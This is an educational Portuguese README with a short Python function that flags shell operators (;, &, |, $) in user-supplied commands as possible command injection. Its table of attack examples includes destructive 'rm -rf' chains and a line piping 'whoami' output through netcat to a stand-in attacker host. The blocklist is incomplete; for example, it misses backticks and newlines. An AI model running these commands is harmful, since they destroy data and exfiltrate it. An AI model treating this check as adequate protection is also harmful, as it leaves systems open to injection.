# 🛡️ Detecção Simples de Injeção de Comando em Python

Este é um exemplo educativo de como implementar uma defesa básica contra **Injeção de Comando** (Command Injection) em aplicações que executam comandos no sistema operacional via Python.

## ⚠️ Objetivo
Proteger o sistema impedindo que o usuário insira operadores de shell perigosos que permitam:
- Executar múltiplos comandos
- Rodar comandos em background
- Fazer redirecionamento ou pipe
- Acessar variáveis de ambiente ou executar comandos aninhados

## 🔍 Por que esses caracteres são perigosos?

| Caractere | Função no Shell                          | Exemplo de Ataque                          | Risco |
|-----------|------------------------------------------|---------------------------------------------|-------|
| `;`       | Separador de comandos                    | `ls; rm -rf /`                              | Executa comando extra |
| `&` / `&&`| Execução em background ou condicional    | `ping 8.8.8.8 && rm -rf ~`                  | Comando condicional |
| `|`       | Pipe (saída de um comando vira entrada)  | `whoami | nc atacante.com 4444`             | Exfiltração de dados |
| `$`       | Expansão de variável ou comando          | `ls $(whoami)` ou `ls $PATH`                | Acesso a informações sensíveis |

> Esses caracteres **não pertencem** a comandos simples e seguros como `ls -la`, `dir`, `cat arquivo.txt`, etc.

## 💻 Código Principal

```python
def verificar_comando(comando):
    """
    Verifica se o comando contém caracteres suspeitos usados em injeção de comando.
    
    Args:
        comando (str): Comando fornecido pelo usuário
    
    Returns:
        str: "Comando Seguro" ou "Comando Suspeito"
    """
    # Lista de operadores de shell que indicam risco de Command Injection
    caracteres_suspeitos = [';', '&', '|', '$']
    
    # Verifica cada caractere suspeito
    for char in caracteres_suspeitos:
        if char in comando:
            return "Comando Suspeito ⚠️"
    
    # Se nenhum caractere perigoso for encontrado
    return "Comando Seguro ✅"


# --- Execução e Teste ---
if __name__ == "__main__":
    print("🔍 Detector de Injeção de Comando\n")
    comando_usuario = input("Digite o comando a ser analisado: ")
    resultado = verificar_comando(comando_usuario)
    print(f"\nResultado: {resultado}")